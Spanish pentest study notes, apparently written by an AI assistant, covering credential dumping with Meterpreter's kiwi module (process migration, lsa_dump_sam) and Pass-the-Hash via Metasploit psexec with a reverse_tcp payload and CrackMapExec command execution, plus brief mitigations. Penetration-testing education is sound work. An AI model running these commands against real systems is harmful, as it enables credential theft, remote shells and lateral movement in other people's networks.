# Apuntes de Seguridad Windows: BadBlue y Pass-the-Hash (PtH)

---

## BadBlue y extracción de hashes con Meterpreter

### 1. ¿Qué es BadBlue?

- BadBlue es un software servidor web popular en los 2000s, conocido por vulnerabilidades que permiten acceso remoto.
- Algunas máquinas Windows comprometidas pueden tener BadBlue instalado o servicios web vulnerables que pueden ser explotados.

---

### 2. Uso de Meterpreter para obtener hashes en sistemas vulnerables

Una vez que tienes acceso a la máquina víctima mediante un exploit (por ejemplo, EternalBlue o cualquier otro), sigue estos pasos para extraer hashes usando Meterpreter y el módulo `kiwi` (una implementación de Mimikatz):

---

#### a) Listar procesos con `pgrep`

En la sesión Meterpreter, para listar procesos y obtener el PID de uno que te interese (normalmente `lsass.exe` o algún proceso estable):

```bash
pgrep -f lsass.exe
```

O simplemente para ver procesos:

```bash
ps
```

---

#### b) Migrar a un proceso estable

Con el PID obtenido, migra la sesión Meterpreter a ese proceso para evitar que la sesión se cierre si el proceso original termina:

```bash
migrate <PID>
```

Ejemplo:

```bash
migrate 456
```

---

#### c) Cargar el módulo kiwi

```bash
load kiwi
```

Kiwi permite ejecutar comandos similares a Mimikatz para extraer credenciales.

---

#### d) Extraer hashes con `lsa_dump_sam`

```bash
lsa_dump_sam
```

Esto mostrará los hashes NTLM y LM de los usuarios locales almacenados en la máquina.

---

### 3. Consideraciones

- Se requiere que la sesión Meterpreter tenga privilegios elevados para cargar kiwi y extraer hashes.
- La migración es importante para estabilidad y evitar detección.
- Usar esta técnica solo en entornos autorizados.

---

## Pass-the-Hash (PtH) con Metasploit y CrackMapExec

### 1. ¿Qué es Pass-the-Hash?

- Técnica que permite autenticarse en sistemas Windows sin necesidad de conocer la contraseña en texto claro.
- Se usa el **hash NTLM** de la contraseña para acceder a servicios SMB, RDP, etc.
- Permite movimientos laterales en redes comprometidas.
- Explota la forma en que Windows gestiona la autenticación.

---

### 2. Requisitos previos

- Tener el **hash NTLM** válido de un usuario.
- Acceso a la red o al sistema objetivo.
- Herramientas que soporten autenticación mediante hash (como Metasploit o CrackMapExec).

---

### 3. Uso de Pass-the-Hash en Metasploit (`msfconsole`)

#### a) Cargar módulo para sesión SMB con hash

```bash
use exploit/windows/smb/psexec
```

#### b) Configurar opciones:

```bash
set RHOSTS <IP_objetivo>
set SMBUser <usuario>
set SMBPass <hash_NTLM>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <tu_IP>
set LPORT <tu_puerto>
```

- Nota: En `SMBPass` se pone el **hash NTLM** precedido por `aad3b435b51404eeaad3b435b51404ee:` si no tienes el hash LM (usualmente se pone solo el hash NTLM con ese prefijo).

#### c) Ejecutar el exploit

```bash
run
```

Si es exitoso, tendrás una sesión Meterpreter sin conocer la contraseña en texto plano.

---

### 4. Uso de Pass-the-Hash con CrackMapExec

#### a) Comando básico:

```bash
crackmapexec smb <IP_objetivo> -u <usuario> -H <hash_NTLM>
```

#### b) Ejemplo:

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:5d41402abc4b2a76b9719d911017c592
```

#### c) Opcional: Enumerar recursos compartidos o ejecutar comandos con hash

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> --shares
```

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H <hash> -x 'ipconfig'
```

---

### 5. Mitigación

- Usar autenticación con Kerberos en lugar de NTLM cuando sea posible.
- Aplicar políticas de restricción de uso de hash.
- Monitorizar uso inusual de hashes.
- Actualizar sistemas y aplicar parches.

---

¿Quieres que te prepare ejemplos prácticos o comandos para estas técnicas?
